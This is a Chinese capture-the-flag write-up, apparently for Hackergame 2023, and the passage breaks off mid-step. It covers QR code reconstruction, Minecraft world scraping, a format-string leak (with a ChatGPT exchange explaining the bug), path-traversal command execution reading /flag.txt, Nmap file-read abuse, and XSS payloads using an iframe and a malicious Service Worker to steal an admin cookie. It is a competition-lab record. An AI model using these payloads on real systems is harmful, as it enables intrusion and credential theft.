可用的填充数据是 11101100 和 00010001，而且是交替填充。继续按 Z 字形阅读第二组八位，得到 00??????——它应该就是 00010001。
填充一看，那一块的右下角是黑白黑黑黑白的卜字形呢。
继续给第四组八位填 11101100，给第六组八位填 00010001，这样操作下去不就得到更多的像素信息了吗？
比方说，我先填个那么两排试一下。
```
#######_##????????????????????????__#_#######
#_____#_##????????????????????????_#__#_____#
#_###_#__#????????????????????????_#__#_###_#
#_###_#___????????????????????????_##_#_###_#
#_###_#_#_??????????#####?????????###_#_###_#
#_____#_#_??????????#___#?????????____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________##??????????#___#??????????##________
###__##_#_??????????#####??????????#_####__##
###_#___#_??????????_#___??????????#_#_##__##
??????#??????????????????????????????????_#??
??????_??????????????????????????????????__??
??????#??????????????????????????????????_#??
??????_????????????????????????????????????__
??????#????????????????????????????????????__
??????_????????????????????????????????????_#
??????#????????????????????????????????????__
??????_??????????????????????????????????##??
??????#??????????????????????????????????#_??
??????_??????????????????????????????????##??
????#####_??????????#####??????????########??
????#___#_??????????#___#??????????_#___#??#_
????#_#_##??????????#_#_#??????????_#_#_#??##
????#___##??????????#___#??????????##___#??#_
????#####_??????????#####??????????######??##
??????_??????????????????????????????????__??
??????#??????????????????????????????????_#??
??????_??????????????????????????????????__??
??????#??????????????????????????????????_#??
??????_????????????????????????????????????__
??????#????????????????????????????????????__
??????_????????????????????????????????????_#
??????#????????????????????????????????????__
??????_??????????????????????????????????##??
____#_#??????????????????????????????????#_??
_####____#??????????#_#__??????????###_#?##??
#__##_#_#_??????????#####??????????########??
________##??????????#___#??????????##___#??#_
#######___??????????#_#_#??????????##_#_#??##
#_____#_##??????????#___#??????????_#___#??#_
#_###_#___??????????#####???????????######_##
#_###_#__#??????????????????????????????#__##
#_###_#_##??????????????????????????????#_###
#_____#_#_??????????????????????????????#____
#######_##??????????????????????????????__#_#
```
以此作为约束再拼几块。
```
#######_##????????????????????????__#_#######
#_____#_##????????????????????????_#__#_____#
#_###_#__#????????????????????????_#__#_###_#
#_###_#___????????????????????????_##_#_###_#
#_###_#_#_??????????#####?????????###_#_###_#
#_____#_#_??????????#___#?????????____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________##??????????#___#??????????##________
###__##_#_??????????#####??????????#_####__##
###_#___#_??????????_#___??????????#_#_##__##
??????#?????????????????????????????????#_#_#
??????_?????????????????????????????????_____
??????#?????????????????????????????????__#_#
??????_?????????????????????????????????#____
??????#?????????????????????????????????_##__
??????_?????????????????????????????????##__#
??????#?????????????????????????????????#____
??????_?????????????????????????????????_####
??????#?????????????????????????????????_#__#
??????_?????????????????????????????????_##__
????#####_??????????#####??????????########_#
????#___#_??????????#___#??????????_#___#__#_
????#_#_##??????????#_#_#??????????_#_#_#__##
????#___##??????????#___#??????????##___#__#_
????#####_??????????#####??????????######__##
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
____#_#??????????????????????????????????????
_####____#??????????#_#__??????????###_######
#__##_#_#_??????????#####??????????########__
________##??????????#___#??????????##___####_
#######___??????????#_#_#??????????##_#_#__##
#_____#_##??????????#___#??????????_#___#__#_
#_###_#___??????????#####???????????######_##
#_###_#__#??????????????????????????????#__##
#_###_#_##??????????????????????????????#_###
#_____#_#_??????????????????????????????#____
#######_##??????????????????????????????__#_#
```
虽然还剩 58 块，但这无疑增强了信心。只要不断前进，道路就会不断延伸，所以，不要停下来啊！
不知过了多少个普朗克时间……
```
#######_##???##___#####??????????___#_#######
#_____#_##?????_#??#_#_??????????__#__#_____#
#_###_#__#?????__??####??___#####__#__#_###_#
#_###_#___???????????#_??_#__#_###_##_#_###_#
#_###_#_#_??????????#####___####_####_#_###_#
#_____#_#_???__??##?#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________##???#_??_#?#___#??????????##________
###__##_#_???##_#__?#####??????????#_####__##
###_#___#_???#_____?_#___??????????#_#_##__##
??????#????????_#??##??__???????????????#_#_#
??????_????????__??##??_#____###___??________
??????#????????????#_??___#__#_##_#_#_#___#_#
??????_????????????####??___####________#____
??????#??????__??##??#_??_#__####_#_#_#__##__
??????_??????_#??#_??##????????????__???##__#
??????#??????__####??##?????????????????#____
??????_??????__###_????#_???????????????_####
??????#????????#_??_#??##???????????????_#__#
??????_????????##??__??#_###_____##??###_##__
????#####_?????????_######_##_#__#_########_#
????#___#_?????????_#___####____###_#___#__#_
????#_#_##???##??__##_#_#####_#__##_#_#_#__##
????#___##???#_??_#_#___#??????????##___#__#_
????#####_?####_#__?#####??????????######__##
??????_????###_____????__??????????##_#____??
??????#????#_??_#????##????????????_?___#_#??
??????_????##??__????#_??____###___??______??
??????#?????????????###??_#__#_##_#??????_#??
??????_????????????_##_??___####___????????__
??????#??????__??##_#??##_#__####_#?_??????__
??????_??????_#??#_##??##??????????__??????_#
??????#????_#__####_???#_??????????#_####??__
??????_????____###_????##??????????__#_####??
____#_#????_#??#_????__????????????#_###_#_??
_####____#?__??##???#_#__###_____#####_######
#__##_#_#_??????????######_##_#__#_########__
________##?????????##___####____#####___####_
#######___???##??__##_#_#####_#__####_#_#__##
#_____#_##???#_??_#_#___#??????????_#___#__#_
#_###_#___?####_#__######???????????######_##
#_###_#__#?###_____#_##????????????__???#__##
#_###_#_##?#_??_#??####????????????__???#_###
#_____#_#_?##??__??????#_____###____#???#____
#######_##?????????????##_#__#_##_#__???__#_#
```
顺带一提上面的填充及拼图过程全是我依赖肉眼观察手做的，用机器做说不定能秒出。从 14:30 做到 19:57 还剩 20 块，嗯做到 20:09，余下 15 块。
```
#######_##?????___######_##___##____#_#######
#_____#_##?????_##_#_#_#_##___###__#__#_____#
#_###_#__#?????__######_#___#####__#__#_###_#
#_###_#___?????_____##_#__#__#_###_##_#_###_#
#_###_#_#_?????_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
??????#????????_#_###_#____###_###__#__##_#_#
??????_????????____##___#____###___#_________
??????#????????_####______#__#_##_#_#_#___#_#
??????_????????__######_#___####________#____
??????#????????_###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_??????????__#_###__#
??????#???#_#__########_#??????????__##_#____
??????_???_____###_#_#_#_??????????#___#_####
??????#???##_###__#_##_##??????????###_#_#__#
??????_???_#_#_##_#__#_#_??????????_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
??????#???##____###_#_###?????###_##__#__#___
??????_???###_#__#_##__##?????#_###___##____#
??????#???#_#__####_#_##_?????#_#__#_#####___
??????_???_____###_##_###?????_###___#_####_#
____#_#???#_####_####____?????_#_#_#_###_#__#
_####____#?????######_#__###_____#####_######
#__##_#_#_?????###########_##_#__#_########__
________##?????######___####____#####___####_
#######___?????#___##_#_#####_#__####_#_#__##
#_____#_##?????##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
嘛人一懒就是这样的，宁愿手做都不愿意写程式（
一看 QRazyBox https://merri.cx/qrazybox/：
Padding Bits Recovery
Recover missing bits by placing terminator and padding bits
……我人肉补了个寂寞啊！
咳咳反正我也没补完让它帮我补补好了。
```
#######_##???##___######_##___##____#_#######
#_____#_##???___##_#_#_#_##___###__#__#_____#
#_###_#__#???_#__######_#___#####__#__#_###_#
#_###_#___???_______##_#__#__#_###_##_#_###_#
#_###_#_#_???_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
??????#??????___#_###_#____###_###__#__##_#_#
??????_??????_#____##___#____###___#_________
??????#??????___####______#__#_##_#_#_#___#_#
??????_??????____######_#___####________#____
??????#??????___###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_??????????__#_###__#
??????#???#_#__########_#??????????__##_#____
??????_???_____###_#_#_#_??????????#___#_####
??????#???##_###__#_##_##??????????###_#_#__#
??????_???_#_#_##_#__#_#_###_____##_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
??????#???##____###_#_###_#__####_##__#__#___
??????_???###_#__#_##__##?????#_###___##____#
??????#???#_#__####_#_##_?????#_#__#_#####___
??????_???_____###_##_###?????_###___#_####_#
____#_#???#_####_####____?????_#_#_#_###_#__#
_####____#?__#_######_#__###_____#####_######
#__##_#_#_?_##############_##_#__#_########__
________##?__#_######___####____#####___####_
#######___?_####___##_#_#####_#__####_#_#__##
#_____#_##?__#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
即便如此，仍余下 12 块：
```
#######_##___##___######_##___##____#_#######
#_____#_###_____##_#_#_#_##___###__#__#_____#
#_###_#__#_#__#__######_#___#####__#__#_###_#
#_###_#___#_________##_#__#__#_###_##_#_###_#
#_###_#_#_#_#_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
??????#???_#____#_###_#____###_###__#__##_#_#
??????_???##__#____##___#____###___#_________
??????#???__#___####______#__#_##_#_#_#___#_#
??????_???_#_____######_#___####________#____
??????#???_#____###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_??????????__#_###__#
??????#???#_#__########_#??????????__##_#____
??????_???_____###_#_#_#_??????????#___#_####
??????#???##_###__#_##_##??????????###_#_#__#
??????_???_#_#_##_#__#_#_??????????_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
??????#???##____###_#_###?????###_##__#__#___
??????_???###_#__#_##__##?????#_###___##____#
??????#???#_#__####_#_##_?????#_#__#_#####___
??????_???_____###_##_###?????_###___#_####_#
____#_#???#_####_####____?????_#_#_#_###_#__#
_####____#___#_######_#__###_____#####_######
#__##_#_#___##############_##_#__#_########__
________##___#_######___####____#####___####_
#######___#_####___##_#_#####_#__####_#_#__##
#_____#_##___#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
这可怎么办呢？别急，还有版本信息和定位图形（虚线）的约束条件没用到。
```
#######_##___##___######_##___##____#_#######
#_____#_###_____##_#_#_#_##___###__#__#_____#
#_###_#__#_#__#__######_#___#####__#__#_###_#
#_###_#___#_________##_#__#__#_###_##_#_###_#
#_###_#_#_#_#_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
?????###___#____#_###_#____###_###__#__##_#_#
?????#___###__#____##___#____###___#_________
?????##_##__#___####______#__#_##_#_#_#___#_#
?????#_###_#_____######_#___####________#____
?????###___#____###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_#__##?????__#_###__#
??????#???#_#__########_###_#_?????__##_#____
??????_???_____###_#_#_#_#_#_#?????#___#_####
??????#???##_###__#_##_###__##?????###_#_#__#
??????_???_#_#_##_#__#_#_###__?????_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
#_#_########____###_#_###?????###_##__#__#___
##__#_____###_#__#_##__##?????#_###___##____#
####__#_###_#__####_#_##_?????#_#__#_#####___
__##_#_#_#_____###_##_###?????_###___#_####_#
____#_#___#_####_####____?????_#_#_#_###_#__#
_####____#___#_######_#__###_____#####_######
#__##_#_#___##############_##_#__#_########__
________##___#_######___####____#####___####_
#######___#_####___##_#_#####_#__####_#_#__##
#_____#_##___#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
这时尚余 8 块——还能不能继续约束呢？当然可以！
不妨手工阅读一部缺失的文本内容：
(E)6769746875622??3(6)
想必它本来应该是「.github.co」：
(E)6769746875622E63(6)
所以缺失的位就是 11100110，这样就又多出了一个约束条件。
```
#######_##___##___######_##___##____#_#######
#_____#_###_____##_#_#_#_##___###__#__#_____#
#_###_#__#_#__#__######_#___#####__#__#_###_#
#_###_#___#_________##_#__#__#_###_##_#_###_#
#_###_#_#_#_#_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
?????###___#____#_###_#____###_###__#__##_#_#
?????#___###__#____##___#____###___#_________
?????##_##__#___####______#__#_##_#_#_#___#_#
?????#_###_#_____######_#___####________#____
?????###___#____###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_#__###_###__#_###__#
??????#???#_#__########_###_#___##___##_#____
??????_???_____###_#_#_#_#_#_#__##_#___#_####
??????#???##_###__#_##_###__##___#_###_#_#__#
??????_???_#_#_##_#__#_#_###_____##_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
#_#_########____###_#_###?????###_##__#__#___
##__#_____###_#__#_##__##?????#_###___##____#
####__#_###_#__####_#_##_?????#_#__#_#####___
__##_#_#_#_____###_##_###?????_###___#_####_#
____#_#___#_####_####____?????_#_#_#_###_#__#
_####____#___#_######_#__###_____#####_######
#__##_#_#___##############_##_#__#_########__
________##___#_######___####____#####___####_
#######___#_####___##_#_#####_#__####_#_#__##
#_____#_##___#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
现在只剩下 7 块了，所以就来进行一个愉快的穷举罢——我不是说让你把所有块穷举掉，而是只穷举右下角的内容块，它只有 8f6c7c18.png 和 eefc9c6a.png 两种可能！
可以用 QRazyBox 解码数据，就不用人工阅读了，节省时间（
如果用 8f6c7c18.png 填充的话会得到乱七八糟的 e964=Gecc94b3，这是不合理的——那一块应当是小写十六进制。
用 eefc9c6a.png 填充则得到了全文 https://gist.github.com/Konano/e9f437ecc94b20005ee6defdd7d46834，这就对了！
```
#######_##___##___######_##___##____#_#######
#_____#_###_____##_#_#_#_##___###__#__#_____#
#_###_#__#_#__#__######_#___#####__#__#_###_#
#_###_#___#_________##_#__#__#_###_##_#_###_#
#_###_#_#_#_#_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
?????###___#____#_###_#____###_###__#__##_#_#
?????#___###__#____##___#____###___#_________
?????##_##__#___####______#__#_##_#_#_#___#_#
?????#_###_#_____######_#___####________#____
?????###___#____###__#__#_#__####_#_#_#__##__
??????_???##__#__#___###_#__###_###__#_###__#
??????#???#_#__########_###_#___##___##_#____
??????_???_____###_#_#_#_#_#_#__##_#___#_####
??????#???##_###__#_##_###__##___#_###_#_#__#
??????_???_#_#_##_#__#_#_###_____##_####_##__
????#####_#__######_######_##_#__#_########_#
????#___#__###_####_#___####____###_#___#__#_
????#_#_##_#_###___##_#_#####_#__##_#_#_#__##
????#___####_#_##_#_#___#___##__#__##___#__#_
????#####_#####_#__#######__#_#_#__######__##
??????_???_###_____##_#____##__###_##_#____##
??????#???_#____##_####_____#____#__#___#_#_#
??????_???###_#_____##_______###___##________
??????#???_##___#########_#__#_##_###__#__##_
??????_???###____##_##______####____#_##__#__
#_#_########____###_#_###_#__####_##__#__#___
##__#_____###_#__#_##__##__##_#_###___##____#
####__#_###_#__####_#_##_#_##_#_#__#_#####___
__##_#_#_#_____###_##_###__###_###___#_####_#
____#_#___#_####_####______###_#_#_#_###_#__#
_####____#___#_######_#__###_____#####_######
#__##_#_#___##############_##_#__#_########__
________##___#_######___####____#####___####_
#######___#_####___##_#_#####_#__####_#_#__##
#_____#_##___#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
可是点开一看……
「我裤子都脱了你就给我看这个？」
所以我隐隐约约感觉 Nano 其实有坑，我还需要在网页提交的华容道的结果。
剩下的块怎么办呢？用相同的参数重新生成就好了。
建议用 https://github.com/nayuki/QR-Code-generator 生成 QR 码，这玩意能细致控制内容位。
生成完是这样子的：
```
#######_##___##___######_##___##____#_#######
#_____#_###_____##_#_#_#_##___###__#__#_____#
#_###_#__#_#__#__######_#___#####__#__#_###_#
#_###_#___#_________##_#__#__#_###_##_#_###_#
#_###_#_#_#_#_#_____#####___####_####_#_###_#
#_____#_#_______###_#___#____#_##_____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________####_#_##_###___#_#_###_#__##________
###__##_#__####_#___#####_#_#___##_#_####__##
###_#___#__###_____#_#_____##__#___#_#_##__##
_#__####___#____#_###_#____###_###__#__##_#_#
_____#___###__#____##___#____###___#_________
___#_##_##__#___####______#__#_##_#_#_#___#_#
__#__#_###_#_____######_#___####________#____
_#___###___#____###__#__#_#__####_#_#_#__##__
#_#_#___#_##__#__#___###_#__###_###__#_###__#
__#___#####_#__########_###_#___##___##_#____
__###__###_____###_#_#_#_#_#_#__##_#___#_####
_###__######_###__#_##_###__##___#_###_#_#__#
_#__#___#__#_#_##_#__#_#_###_____##_####_##__
#_#_#####_#__######_######_##_#__#_########_#
###_#___#__###_####_#___####____###_#___#__#_
_#_##_#_##_#_###___##_#_#####_#__##_#_#_#__##
#_#_#___####_#_##_#_#___#___##__#__##___#__#_
_#_######_#####_#__#######__#_#_#__######__##
##_##__#___###_____##_#____##__###_##_#____##
__########_#____##_####_____#____#__#___#_#_#
####_#__#####_#_____##_______###___##________
_#__###_##_##___#########_#__#_##_###__#__##_
#___#___#####____##_##______####____#_##__#__
#_#_########____###_#_###_#__####_##__#__#___
##__#_____###_#__#_##__##__##_#_###___##____#
####__#_###_#__####_#_##_#_##_#_#__#_#####___
__##_#_#_#_____###_##_###__###_###___#_####_#
____#_#___#_####_####______###_#_#_#_###_#__#
_####____#___#_######_#__###_____#####_######
#__##_#_#___##############_##_#__#_########__
________##___#_######___####____#####___####_
#######___#_####___##_#_#####_#__####_#_#__##
#_____#_##___#_##_#_#___#__###___##_#___#__#_
#_###_#____####_#__###########__#_#_######_##
#_###_#__#_###_____#_##________##____#__#__##
#_###_#_####____#_#######___#____#______#_###
#_____#_#_###_#_____##_#_____###____##_##____
#######_##_##__####_#_###_#__#_##_#__#____#_#
```
容易验证它和剩下的块能对得上。
于是我开始肉拼华容道。又不知过了多少个普朗克时间，终于以两千余步拼完，顺利提交。
（其实如果通 Hard 的话得到的还是 Flag 1）
顺带一提，我后来找到了这个。
https://alexyuisingwu.github.io/sliding-puzzle-solver/
选 Strategically 然后录屏，跟着它一步步操作就好了——但是考虑到步数近两千步，很容易跟不上而不知道拼到了哪里，不如自己学会规则然后拼，，、（

麦恩·库拉夫特
瑞典原神，启动！
顺着火把走啊走，一直走到一片水域。打开下水道盖下潜，一直顺着火把找到一个告示牌，就得到了 Flag 1。
既然知道是告示牌了，那就……
https://github.com/Megageorgio/nbt-scrapper
Sign at x:3279, y:-33, z:-1895:
flag{pAR3inG
_ANvI1_iS
eAaasY2}
好好好好好，/tp 3279 -33 -1895 到那里发现四周都被堵住了。
Book "说明" by Mivik
(content hash = E3D9F66BE4D5C4C7D56DE59793835B678EA0E6993DB57D998E1A4B9237687F72)
Found 1x minecraft:written_book in slot None of block entity minecraft:lectern at x:575, y:93, z:-111
嗯？这个有点东西。
其实我一开始把 93 的正负搞反了，以至于掉出了世界（
（相关过程见录像 javaw 2023-10-21 01-03-17-387.mp4）

未来磁盘
硬找循环节，然后把循环部分删掉一大堆强制解压（忽略校验错误）。
不得不承认有运气的成分在——虽说有提示罢，但是看了提示更不懂了，所以我其实也没依赖提示。
中途 HxD 报「边界检查错误」差点以为前功尽弃。
非常好题目，就是做完之后我 SSD 估计也快报废了啊嗯。
（毕竟循环节找错的话就白做了）

初学 C 语言
我丢去问 ChatGPT：
```
现在有这样的 C 语言代码：
#include<stdio.h>
#include<string.h>
#include<unistd.h>

void test()
{
    char buf[1024];
    char secrets[64]="a_very_secret_string";
    int secreti1=114514,secreti2=1919810;
    char publics[64]="a_public_string";
    int publici=0xdeadbeef;
    char flag1[64]="a_flag";
    FILE* fp=fopen("flag_f503be2d","r");
    fgets(flag1,63,fp);
    fclose(fp);
    //get flag2 in another file
    while(1)
    {
        printf("Please input your instruction:\n");
        fgets(buf,1023,stdin);
        if(memcmp(buf,"exit",4)==0)
            break;
        int t=printf(buf,publics,publici);
        if(t>1024)
        {
            printf("Too long!\n");
            break;
        }
        printf("\n");
    }
}

int main()
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    test();
    return 0;
}

//gcc pwn.c -o pwn -static-pie
你能找出其中的漏洞吗？
```
它回答我说：
```
该 C 语言代码存在格式化字符串攻击 (Format String Attack) 的漏洞。
在这段代码中，printf 函数直接使用了用户输入的 buf，这在 C 语言中是非常危险的，因为 printf 函数在执行时会解析其参数中的格式化字符串。
也就是说，如果用户在输入中加入 "%s"，"%d" 等格式化字符串，那么 printf 函数会尝试从调用栈上获取对应的参数。如果用户输入的格式化字符串很多，就可能使得 printf 函数访问到栈上应该不能被用户访问的内存，如程序的返回地址等。
这就是典型的格式化字符串攻击，攻击者可以通过控制格式化字符串，泄露内存中的信息，或者篡改内存中的数据，从而实现远程代码执行（RCE）。
例如，攻击者可以通过发送包含 "%x" 的字符串来读取并泄露内存中的信息，或者通过发送包含 "%n" 的字符串来改写内存中的数据。
所以，一个正确的做法是，程序员应该始终使用带有固定格式字符串的 printf 函数，比如 printf("%s", buf)，而不是直接使用 printf(buf)。
```
再问：
```
能够取出变量 flag1 的数据吗？
```
回答：
```
取出变量flag1的数据需要利用到漏洞引发格式化字符串攻击。以下是一种可能的取法，需要注意实际操作中可能因内存布局等问题有所变化，攻击者可能需要多次尝试以确定准确的偏移量。
由于在test()函数中，我们知道buf[]是在函数调用栈上的局部变量，它是在flag1[]和printf()调用之间分配的。因此buf[]和flag1[]之间存在一定的栈偏移。
在执行printf()调用时，格式化字符串中的%x可以用来读取栈上的数据，%n可以用于写入数据到栈空间，同时可以使用$来指定参数的位置。
假设buf和flag1之间的栈偏移为 N，那么我们可以构造格式化字符串 %N$x 来读取存储在flag1的内容。
举个例子，如果N为10，那么就可以直接输入%10$s，这样printf函数就会从栈上读取偏移为10的字符串，并将其输出，即输出flag1的值。
需要注意的是，这是一种潜在的攻击方法，是否可行还取决于程序的具体运行环境和状态。如果有必要，可以使用漏洞利用技术对程序进行调试，以观察和确定实际的内存布局和栈空间分配情况。
```
好好好好好！
```
%26$llx %27$llx %28$llx %29$llx
```
它输出了个 3445527b67616c66 66546e3152705f64 6f735f656430635f a7d595a34655f，注意这个输出是强行按小端序阅读的结果。
flag{RE4d_pR1nTf_c0de_so_e4ZY}\n
好好好好好我 C 语言终于入门叻，，、
读 Flag 2 的话就需要劫持掉 exit，调用 system 函数强行进入 Bash 罢。那就需要泄露 libc 相关的地址。
Binary 已知所以看看 GOT。

猫咪状态监视器
vi 一看 /usr/sbin/service 发现就是没做甚么过滤的脚本，所以整个活：
```
STATUS
../../bin/bash -c ls
```
「正常显示 ls 了啊嗯」
```
STATUS
../../bin/cat /flag.txt
```
——我一开始以为档案名是 flag1.txt 结果死活读不出，调试了好久才发现是自己犯蠢了。

Z 公司的服务器
上网搜寻 B00000000000000 发现是 Zmodem 协议，结合题名「Z 公司」看出似乎是正确的方向。
SecureCRT，启动！
顺利接收到档案 flag.txt，内容为：
flag{anc1ent_tr4nsf3R_pr0tOcoi_15_57111_In_U5e_t0d4y}\n
至于 Flag 2，不妨试试用 Tcpreplay 重现数据包。
只是 Tcpreplay 还是不太支援 Windows，所以：
https://github.com/astibal/pplay
```
python ./pplay.py --pcap .\prob05.pcapng --server 127.0.0.2:9999 --connection 192.168.16.1:63752
```
接收得到 flag.jpg，然而内容残缺。连蒙带猜得到 Flag 2：
flag{traFf1c_aNa1y51s_4_ZMODEM}

第三新XSS
巡猎
还是 iframe 出奇迹啊嗯（
```
<iframe id="ifr" src="../admin/"></iframe>
<script>document.getElementById('ifr').onload = () => document.title = document.getElementById('ifr').contentWindow.document.cookie;</script>
```

未公开题目：prob03
「嗳涐僦対涐ぬ嚸，莂总恠外缅廆绲，栲虑栲虑涐の感绶。」
观察 home.php 处的网页注释可以发现 role_change.php，将 mid 与 role 均设为 1 可将游客更改为正式会员。
所有账户的退款订单池共用，所以不断注册小号就可以实现众筹。
flag{WhaT_4_Cr4Zy_7hur5d4Y}

第二阶段
关键词过滤喵，谢谢喵
排序喵
感觉要用到循环的样子，不过效率不能太低了所以还优化了一会。
```
把【(\r\n)+】替换成【\n】喵
把【(\r)+】替换成【\n】喵
把【(\n)+】替换成【\n】喵
把【^\n】替换成【】喵
把【\n$】替换成【】喵
把【$】替换成【\n】喵
把【([^\n]+)\n】替换成【可恶的\1\n\1售人控\n】喵

如果看到【可恶的】就跳转到【可恶的售人控】喵

可恶的售人控：
把【[^\n]售人控\n】替换成【售人控\n】喵
把【可恶的([^\n]+)\n售人控】替换成【\1】喵
重复把【((可恶的[^\n]+\n[^\n]+售人控\n)+)(((?!可恶的)[^\n]+(?!兽人控)\n)+)】替换成【\3\1】喵
如果看到【可恶的】就跳转到【可恶的售人控】喵

把【\n$】替换成【】喵

谢谢喵
```

逝界计划
配置 Nmap 集成：
```
-iL /flag.txt -o /media/cdrom/flag.png
```
然后在媒体集成把档案下回来即可。

第三新XSS
记忆
首先以 application/javascript 类型创建 Service Worker：
```
{"Content-Type": "application/javascript", "Service-Worker-Allowed": "/"}
```
```
self.addEventListener('fetch', (event) => {
    if (event.request.clone().url.includes('admin')) {
        event.respondWith(new Response('<script>setTimeout(\'document.title = `\\\\u{770B}\\\\u{770B}\\\\u{5927}\\\\u{51E0}\\\\u{628A}\\\\u{FF01}${document.cookie}`;\', 800);</script>', { headers: { 'Content-Type': 'text/html' } }).clone());
    };
});
```
然后注册该 Service Worker：
```
